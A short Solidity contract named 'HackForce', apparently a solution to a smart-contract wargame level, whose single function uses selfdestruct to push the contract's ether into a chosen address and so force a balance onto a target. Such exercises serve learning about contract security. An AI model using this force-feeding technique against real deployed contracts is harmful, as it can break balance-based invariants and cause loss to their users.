// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;


contract HackForce {

    function hack(address payable addr) public payable {
        selfdestruct(addr);
    }

}
